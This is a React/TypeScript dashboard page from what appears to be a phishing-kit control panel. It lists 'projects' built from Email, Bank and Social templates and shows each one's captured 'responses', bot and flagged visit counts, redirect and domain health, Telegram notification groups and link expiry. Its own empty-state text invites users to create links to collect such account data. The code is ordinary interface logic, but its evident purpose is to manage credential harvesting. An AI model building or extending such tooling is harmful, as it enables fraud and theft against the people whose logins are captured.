"use client";

import { useState, useEffect, useMemo } from 'react';
import { useAppState } from '../context/AppContext';
import { securedApi, authApi } from '../../utils/auth';
import LoadingSpinner from '../components/LoadingSpinner';
import TransactionResultModal from '../components/TransactionResultModal';
import CreateLinkModal from '../components/admin/projects/CreateLinkModal';
import ResponseModal from '../components/admin/projects/ResponseModal';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import {
  faCopy, 
  faExternalLinkAlt, 
  faSync, 
  faCog, 
  faTrash,
  faPlus,
  faFolderOpen // Added faFolderOpen
} from '@fortawesome/free-solid-svg-icons';
import ActionsHandler from '../components/admin/projects/ActionsHandler';

interface Project {
  id: string;
  formId: string;
  projectId: string;
  projectType: string;
  projectTitle: string;
  templateNiche: string;
  templateTitle: string;
  templateType: string;
  pageHealth: string;
  redirectId?: string;
  redirectURL?: string;
  redirectHealth?: string;
  domainId?: string;
  domainURL?: string;
  domainHealth?: string;
  pageVisits: number;
  botVisits: number;
  flaggedVisits: number;
  expiryDate: string;
  response: string;
  email?: string;
  telegramGroupId?: string;
  responseCount: number;
  responses: any[];
  templateVariables: string;
  systemStatus: string;
  pageURL?: string;
  templateId: string;
  notifyVisits: boolean; // Added notifyVisits
}
import { formatDistance, isValid, parseISO } from 'date-fns';
import ProjectSettingsModal from 'app/components/admin/projects/ProjectSettingsModal';

export default function ProjectLinks() {
  const { appData, setAppData } = useAppState();

  // Pagination state
  const [currentPage, setCurrentPage] = useState(1);
  const rowsPerPage = 10;

  // Filters
  const [filters, setFilters] = useState({
    category: '',
    type: '',
    template: ''
  });

  // Response Modal State
  const [selectedProject, setSelectedProject] = useState<Project | null>(null);
  const [showResponseModal, setShowResponseModal] = useState(false);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false); // New state for refresh
  const [projects, setProjects] = useState<Project[]>([]);
  const [showCreateModal, setShowCreateModal] = useState(false);
  const [showResultModal, setShowResultModal] = useState(false);
  const [resultModalProps, setResultModalProps] = useState({
    type: 'success' as 'success' | 'error' | 'warning',
    title: '',
    message: '',
    details: {}
  });
  // Settings modal state
  const [showSettingsModal, setShowSettingsModal] = useState(false);
  const [settingsProject, setSettingsProject] = useState<Project | null>(null);

  const handleCreateLink = () => {
    setShowCreateModal(true);
  };

  const handleRefreshData = async () => {
    setRefreshing(true);
    try {
      await authApi.updateAppData(setAppData);
    } catch (error) {
      console.error('Error refreshing application data:', error);
    } finally {
      setRefreshing(false);
    }
  };

  useEffect(() => {
    const fetchProjects = async () => {
      try {
        setLoading(true);
        
        // Project Data Transformation Function
        const transformProjectData = (rawData: any, headers?: string[]) => {
          const safeHeaders = headers || [
            'id', 'formId', 'projectId', '', '', '', '', '', '', '', '', '', '', 
            'projectTitle', '', 'templateNiche', 'templateTitle', 'templateType', 
            'pageHealth', 'pageVisits', 'botVisits', 'expiryDate', 'response', 'systemStatus',
            'redirectId', 'redirectURL', 'redirectHealth', 'domainId', 'domainURL', 'domainHealth',
            'email', 'telegramGroupId', 'templateVariables', 'templateId', 'notifyVisits' // Added notifyVisits
          ];

          const processedData = Array.isArray(rawData) ? rawData : rawData.data || [];

          const columnIndices = {
            id: safeHeaders.indexOf('id'),
            formId: safeHeaders.indexOf('formId'),
            projectId: safeHeaders.indexOf('projectId'),
            projectTitle: safeHeaders.indexOf('projectTitle'),
            templateNiche: safeHeaders.indexOf('templateNiche'),
            templateTitle: safeHeaders.indexOf('templateTitle'),
            templateType: safeHeaders.indexOf('templateType'),
            pageHealth: safeHeaders.indexOf('pageHealth'),
            pageVisits: safeHeaders.indexOf('pageVisits'),
            botVisits: safeHeaders.indexOf('botVisits'),
            flaggedVisits: safeHeaders.indexOf('flaggedVisits'),
            expiryDate: safeHeaders.indexOf('expiryDate'),
            response: safeHeaders.indexOf('response'),
            systemStatus: safeHeaders.indexOf('systemStatus'),
            pageURL: safeHeaders.indexOf('pageURL'),
            redirectId: safeHeaders.indexOf('redirectId'),
            redirectURL: safeHeaders.indexOf('redirectURL'),
            redirectHealth: safeHeaders.indexOf('redirectHealth'),
            domainId: safeHeaders.indexOf('domainId'),
            domainURL: safeHeaders.indexOf('domainURL'),
            domainHealth: safeHeaders.indexOf('domainHealth'),
            email: safeHeaders.indexOf('email'),
            telegramGroupId: safeHeaders.indexOf('telegramGroupId'),
            templateVariables: safeHeaders.indexOf('templateVariables'),
            templateId: safeHeaders.indexOf('templateId'),
            notifyVisits: safeHeaders.indexOf('notifyVisits'), // Added notifyVisits
          };

          return processedData.map((project: any) => {
            // Safely parse responses
            let parsedResponses: any[] = [];
            try {
              const responseDataStr = project[columnIndices.response] || '[]';
              // Handle different response formats
              if (typeof responseDataStr === 'string') {
                // Remove any extra escaping
                const cleanedResponseStr = responseDataStr
                  .replace(/\\(?=")/g, '')
                  .replace(/^"/, '')
                  .replace(/"$/, '');
                
                // Try to parse as JSON
                const parsedData = JSON.parse(cleanedResponseStr);
                
                // Ensure parsed data is an array
                if (Array.isArray(parsedData)) {
                  parsedResponses = parsedData;
                } else if (typeof parsedData === 'object') {
                  // If it's an object, wrap it in an array
                  parsedResponses = [parsedData];
                } else {
                  // If it's a primitive, create a single-item array
                  parsedResponses = parsedData ? [parsedData] : [];
                }
              } else if (Array.isArray(responseDataStr)) {
                // If it's already an array, use it directly
                parsedResponses = responseDataStr;
              } else if (typeof responseDataStr === 'object') {
                // If it's an object, wrap it in an array
                parsedResponses = [responseDataStr];
              }
            } catch (error) {
              console.warn('Error parsing project responses:', error);
              parsedResponses = [];
            }

            return {
              id: project[columnIndices.id] || '',
              formId: project[columnIndices.formId] || '',
              projectId: project[columnIndices.projectId] || '',
              projectTitle: project[columnIndices.projectTitle] || '',
              templateNiche: project[columnIndices.templateNiche] || '',
              templateTitle: project[columnIndices.templateTitle] || '',
              templateType: project[columnIndices.templateType] || '',
              projectType: project[columnIndices.templateType] || '',
              pageHealth: project[columnIndices.pageHealth] || '',
              pageVisits: project[columnIndices.pageVisits] || 0,
              botVisits: project[columnIndices.botVisits] || 0,
              flaggedVisits: project[columnIndices.flaggedVisits] || 0,
              expiryDate: project[columnIndices.expiryDate] || '',
              response: project[columnIndices.response] || '[]',
              responseCount: parsedResponses.length,
              responses: parsedResponses.map(response => 
                typeof response === 'string' ? response : JSON.stringify(response)
              ),
              systemStatus: project[columnIndices.systemStatus] || '',
              pageURL: project[columnIndices.pageURL] || '',
              redirectId: project[columnIndices.redirectId] || '',
              redirectURL: project[columnIndices.redirectURL] || '',
              redirectHealth: project[columnIndices.redirectHealth] || '',
              domainId: project[columnIndices.domainId] || '',
              domainURL: project[columnIndices.domainURL] || '',
              domainHealth: project[columnIndices.domainHealth] || '',
              email: project[columnIndices.email] || '',
              telegramGroupId: project[columnIndices.telegramGroupId] || '',
              templateVariables: project[columnIndices.templateVariables] || '{}',
              templateId: project[columnIndices.templateId] || '',
              notifyVisits: project[columnIndices.notifyVisits] === 'TRUE' || false, // Initialize notifyVisits
            };
          });
        };

        const projectData = transformProjectData(
          appData?.data?.projects?.data || [], 
          appData?.data?.projects?.headers || []
        );
        setProjects(projectData);
      } catch (error) {
        console.error('Error fetching projects:', error);
        setProjects([]);
      } finally {
        setLoading(false);
      }
    };

    fetchProjects();
  }, [appData]);

  // Filtering Logic
  const filteredProjects = useMemo(() => {
    return projects
      .slice() // create a shallow copy to avoid mutating state
      .reverse() // reverse so last is first
      .filter(project => 
        (!filters.category || project.templateNiche === filters.category) &&
        (!filters.template || project.templateTitle === filters.template) &&
        (!filters.type || project.templateType === filters.type)
      );
  }, [projects, filters]);

  // Pagination calculation
  const indexOfLastProject = currentPage * rowsPerPage;
  const indexOfFirstProject = indexOfLastProject - rowsPerPage;
  const currentProjects = filteredProjects.slice(indexOfFirstProject, indexOfLastProject);

  // Pagination change handler
  const paginate = (pageNumber: number) => setCurrentPage(pageNumber);

  // Page-specific methods
  // Time left logic from redirect page
  const calculateTimeRemaining = (expiryDateString: string) => {
    const expiryDate = new Date(expiryDateString);
    const now = new Date();
    const difference = expiryDate.getTime() - now.getTime();

    if (difference <= 0) return 'Expired';

    const days = Math.floor(difference / (1000 * 60 * 60 * 24));
    const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));

    if (days > 0) {
      return `${days} day${days !== 1 ? 's' : ''} ${hours} hr${hours !== 1 ? 's' : ''}`;
    }
    if (hours > 0) {
      return `${hours} hr${hours !== 1 ? 's' : ''} ${minutes} min${minutes !== 1 ? 's' : ''}`;
    }
    return `${minutes} min${minutes !== 1 ? 's' : ''}`;
  };

  // Mobile View Renderer
  const renderMobileView = (project: Project) => (
    <div key={project.id} className="grid grid-cols-3 gap-2 items-center border-b dark:border-gray-700 py-2">
      <div>
        <span className="font-semibold text-gray-900 dark:text-white">{project.projectTitle}</span>
        <span className="text-xs block text-gray-500 dark:text-gray-400">
          {project.templateNiche} - {project.templateType}
        </span>
        {project.expiryDate && (
          <span className="text-xs block text-red-500 mt-1">
            Expires {calculateTimeRemaining(project.expiryDate)}
          </span>
        )}
      </div>
      <div className="text-center">
        <button 
          onClick={() => {
            setSelectedProject(project);
            setShowResponseModal(true);
          }}
          className="text-blue-600"
        >
          {project.responseCount} Responses
        </button>
      </div>
      {project.systemStatus?.toLowerCase() === 'active' && (
        <div className="text-center flex items-center justify-center gap-2">
          <ActionsHandler 
            project={project} 
            onCopy={() => {}}
            onRefresh={() => {}}
            onDelete={(id) => {
              setProjects(prev => prev.filter(p => p.id !== id));
            }}
            onSettings={() => {
              setSettingsProject(project);
              setShowSettingsModal(true);
            }}
          />
        </div>
      )}
    </div>
  );

  // Desktop View Renderer
  const renderDesktopView = (project: Project) => (
    <tr key={project.id} className="hover:bg-gray-50">
      <td className="px-4 py-2">
        <div className="font-semibold">{project.projectTitle}</div>
        <div className="text-xs text-gray-500">
          {project.templateNiche} - {project.templateType}
        </div>
      </td>
      <td className="px-4 py-2 text-center">
        <button 
          onClick={() => {
            setSelectedProject(project);
            setShowResponseModal(true);
          }}
          className="text-blue-600 hover:underline"
        >
          {project.responseCount} Responses
        </button>
      </td>
      <td className="px-4 py-2 text-center">{project.pageHealth}</td>
      <td className="px-4 py-2 text-center">{project.pageVisits}</td>
      <td className="px-4 py-2 text-center">
        <span className={`text-sm font-medium ${
          calculateTimeRemaining(project.expiryDate) === 'Expired'
            ? 'text-red-600'
            : calculateTimeRemaining(project.expiryDate).includes('day')
              ? 'text-green-600'
              : 'text-yellow-600'
        }`}>
          {calculateTimeRemaining(project.expiryDate)}
        </span>
      </td>
      {project.systemStatus?.toLowerCase() === 'active' && (
        <td className="px-4 py-2 text-center flex items-center justify-center gap-2">
          <ActionsHandler 
            project={project} 
            onCopy={() => {}}
            onRefresh={() => {}}
            onDelete={(id) => {
              setProjects(prev => prev.filter(p => p.id !== id));
            }}
            onSettings={() => {
              setSettingsProject(project);
              setShowSettingsModal(true);
            }}
          />
        </td>
      )}
    </tr>
  );

  // Removed unused method


  return (
    <div className="p-4">
      {/* Conditional rendering for header and project list */}
      {!loading && filteredProjects.length === 0 ? (
        <div className="flex flex-col items-center justify-center min-h-[calc(100vh-64px)] text-center">
          <FontAwesomeIcon icon={faFolderOpen} className="w-20 h-20 text-blue-500 mb-6" />
          <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-4">No Projects Available</h2>
          <p className="text-lg text-gray-600 dark:text-gray-300 mb-8 max-w-md">
            It looks like you haven't created any projects yet. To get started, create your first link for <span className="font-bold text-blue-600 dark:text-blue-400">Email, Bank, or Social accounts</span> to begin collecting valuable data and unlock powerful features.
          </p>
          <button
            onClick={() => setShowCreateModal(true)}
            className="bg-blue-500 hover:bg-blue-600 text-white px-6 py-3 rounded-lg flex items-center justify-center text-lg font-medium transition-colors"
          >
            <FontAwesomeIcon icon={faPlus} className="mr-2" /> Create Your First Link
          </button>
        </div>
      ) : (
        <>
      {/* Header with Create Link, Refresh, and Filters */}
      <div className="mb-4">
            <div className="flex justify-between items-center mb-4">
              <button
                onClick={handleRefreshData}
                className="bg-gray-200 dark:bg-gray-700 text-gray-800 dark:text-white px-4 py-2 rounded flex items-center hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors duration-200"
                title="Refresh Data"
                disabled={refreshing}
              >
                <FontAwesomeIcon icon={faSync} className={`mr-2 text-lg ${refreshing ? 'animate-spin' : ''}`} /> Get Update
              </button>
              <button
                onClick={() => setShowCreateModal(true)}
                className="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded flex items-center"
              >
                <FontAwesomeIcon icon={faPlus} className="mr-2" /> Create Link
              </button>
            </div>
            <div className="flex space-x-2">
              <select 
                value={filters.category}
                onChange={(e) => setFilters(prev => ({ ...prev, category: e.target.value }))}
                className="form-select dark:bg-gray-700 dark:border-gray-600 dark:text-white"
              >
                <option value="">All Categories</option>
                {Array.from(new Set(projects.map(p => p.templateNiche))).map(category => (
                  <option key={category} value={category}>{category}</option>
                ))}
              </select>
              <select 
                value={filters.type}
                onChange={(e) => setFilters(prev => ({ ...prev, type: e.target.value }))}
                className="form-select dark:bg-gray-700 dark:border-gray-600 dark:text-white"
              >
                <option value="">All Types</option>
                {Array.from(new Set(projects.map(p => p.templateType))).map(type => (
                  <option key={type} value={type}>{type}</option>
                ))}
              </select>
              <select 
                value={filters.template}
                onChange={(e) => setFilters(prev => ({ ...prev, template: e.target.value }))}
                className="form-select dark:bg-gray-700 dark:border-gray-600 dark:text-white"
              >
                <option value="">All Templates</option>
                {Array.from(new Set(projects.map(p => p.templateTitle))).map(template => (
                  <option key={template} value={template}>{template}</option>
                ))}
              </select>
            </div>
          </div>

          {/* Mobile View */}
          <div className="md:hidden">
            {currentProjects.map((project) => renderMobileView(project))}
          </div>

          {/* Desktop View */}
          <table className="w-full hidden md:table">
            <thead>
              <tr className="bg-gray-100 dark:bg-gray-700">
                <th className="px-4 py-2 text-left text-gray-900 dark:text-white">Project Title</th>
                <th className="px-4 py-2 text-center text-gray-900 dark:text-white">Responses</th>
                <th className="px-4 py-2 text-center text-gray-900 dark:text-white">Page Health</th>
                <th className="px-4 py-2 text-center text-gray-900 dark:text-white">Page Visits</th>
                <th className="px-4 py-2 text-center text-gray-900 dark:text-white">Time Left</th>
                {currentProjects.some(project => project.systemStatus?.toLowerCase() === 'active') && (
                  <th className="px-4 py-2 text-center text-gray-900 dark:text-white">Actions</th>
                )}
              </tr>
            </thead>
            <tbody>
              {currentProjects.map((project) => (
                <tr key={project.id} className="border-b border-gray-200 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-700">
                  <td className="px-4 py-2">
                    <div className="font-semibold text-gray-900 dark:text-white">{project.projectTitle}</div>
                    <div className="text-xs text-gray-500 dark:text-gray-400">
                      {project.templateNiche} - {project.templateType}
                    </div>
                  </td>
                  <td className="px-4 py-2 text-center">
                    <button 
                      onClick={() => {
                        setSelectedProject(project);
                        setShowResponseModal(true);
                      }}
                      className="text-blue-600 hover:underline"
                    >
                      {project.responseCount} Responses
                    </button>
                  </td>
                  <td className="px-4 py-2 text-center text-gray-900 dark:text-white">{project.pageHealth}</td>
                  <td className="px-4 py-2 text-center text-gray-900 dark:text-white">{project.pageVisits}</td>
                  <td className="px-4 py-2 text-center">
                    <span className={`text-sm font-medium ${
                      calculateTimeRemaining(project.expiryDate) === 'Expired'
                        ? 'text-red-600'
                        : calculateTimeRemaining(project.expiryDate).includes('day')
                          ? 'text-green-600'
                          : 'text-yellow-600'
                    }`}>
                      {calculateTimeRemaining(project.expiryDate)}
                    </span>
                  </td>
                  {project.systemStatus?.toLowerCase() === 'active' && (
                    <td className="px-4 py-2 text-center flex items-center justify-center gap-2">
                      <ActionsHandler 
                        project={project} 
                        onCopy={() => {}}
                        onRefresh={() => {}}
                        onDelete={(id) => {
                          setProjects(prev => prev.filter(p => p.id !== id));
                        }}
                        onSettings={() => {
                          setSettingsProject(project);
                          setShowSettingsModal(true);
                        }}
                      />
                    </td>
                  )}
                </tr>
              ))}
            </tbody>
          </table>
          {/* Pagination Controls */}
          <div className="flex justify-center items-center mt-4 space-x-2">
            {filteredProjects.length > rowsPerPage && (
              <div className="flex items-center">
                {Array.from(
                  { length: Math.ceil(filteredProjects.length / rowsPerPage) },
                  (_, i) => i + 1
                ).map((number) => (
                  <button
                    key={number}
                    onClick={() => paginate(number)}
                    className={`mx-1 px-3 py-1 rounded ${currentPage === number ? 'bg-blue-500 text-white' : 'bg-gray-200 dark:bg-gray-700 dark:text-gray-200'}`}
                  >
                    {number}
                  </button>
                ))}
              </div>
            )}
          </div>
        </>
      )}

      {showResponseModal && (
        <ResponseModal 
          selectedProject={selectedProject} 
          onClose={() => setShowResponseModal(false)} 
        />
      )}

      {/* Create Link Modal */}
      {showCreateModal && (
        <CreateLinkModal
          onClose={() => setShowCreateModal(false)}
          onSave={handleCreateLink}
        />
      )}

      {/* Transaction Result Modal */}
      <TransactionResultModal
        isOpen={showResultModal}
        onClose={() => {
          setShowResultModal(false);
          if (resultModalProps.type === 'success') {
            setShowCreateModal(false);
          }
        }}
        type={resultModalProps.type}
        title={resultModalProps.title}
        message={resultModalProps.message}
        details={resultModalProps.details}
      />

      {/* Loading State */}
      {/* Loading State for initial fetch */}
      {loading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
          <LoadingSpinner size="large" />
        </div>
      )}
      {/* Loading State for refresh action */}
      {refreshing && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
          <LoadingSpinner size="large" />
        </div>
      )}

      {/* Project Settings Modal */}
      {showSettingsModal && settingsProject && (
        <ProjectSettingsModal
          project={settingsProject}
          onClose={() => setShowSettingsModal(false)}
          onSave={(updatedData) => {
            setProjects(prev =>
              prev.map(p =>
                p.projectId === settingsProject.projectId
                  ? { ...p, ...updatedData }
                  : p
              )
            );
            setShowSettingsModal(false);
          }}
        />
      )}
    </div>
  );
}
